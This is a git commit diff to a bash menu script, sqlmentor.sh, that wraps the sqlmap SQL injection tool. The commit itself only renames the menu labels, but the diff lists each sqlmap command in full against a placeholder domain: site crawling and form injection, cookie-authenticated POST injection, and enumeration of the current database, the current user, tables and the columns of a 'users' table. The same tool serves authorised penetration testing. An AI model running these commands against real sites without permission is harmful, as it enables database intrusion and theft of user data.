edbe73d21342347a8172184c3749b209220f15d0
psycolulz <112537894+psycolulz@users.noreply.github.com>
2022-10-13 16:10:46 -0400

    Update sqlmentor.sh

--- sqlmentor.sh
+++ sqlmentor.sh
@@ -25,56 +25,56 @@ options=("1) SQL Crawling" "2) SQL Crawling + Forms" "3) SQL GET Req." "4) SQL P
 select opt in "${options[@]}"
 do 
 case $opt in 
-" SQL Crawling")
+"1) SQL Crawling")
 # Do Not Forget To Replace The Default Domains
 command clear
 command sqlmap -u https://enterdomainhere.com/ --crawl=2
 ;;
-"SQL Crawling + Forms")
+"2) SQL Crawling + Forms")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2
 ;;
-"3. SQL GET Req.")
+"3) SQL GET Req.")
 command clear
 command sqlmap -u https://enterdomainhere.com/
 ;;
-"4. SQL POST Req.")
+"4) SQL POST Req.")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val"
 ;;
-"5. SQL Auth Site")
+"5) SQL Auth Site")
 command clear
 command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2"
 ;;
-"6. Collect DB & User")
+"6) Collect DB & User")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user
 ;;
-"7. SQL & Tables")
+"7) SQL & Tables")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb"
 ;;
-"8. SQL User Columns")
+"8) SQL User Columns")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users"
 ;;
-"9. SQL mssql DB")
+"9) SQL mssql DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql"
 ;;
-"10. SQL mysql DB")
+"10) SQL mysql DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql"
 ;;
-"11. SQL oracle DB")
+"11) SQL oracle DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle"
 ;;
-"12. SQL postgres DB")
+"12) SQL postgres DB")
 command clear
 command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres"
 ;;
-"13. Update Tool")
+"13) Update Tool")
 command clear
 command git pull
 command clear
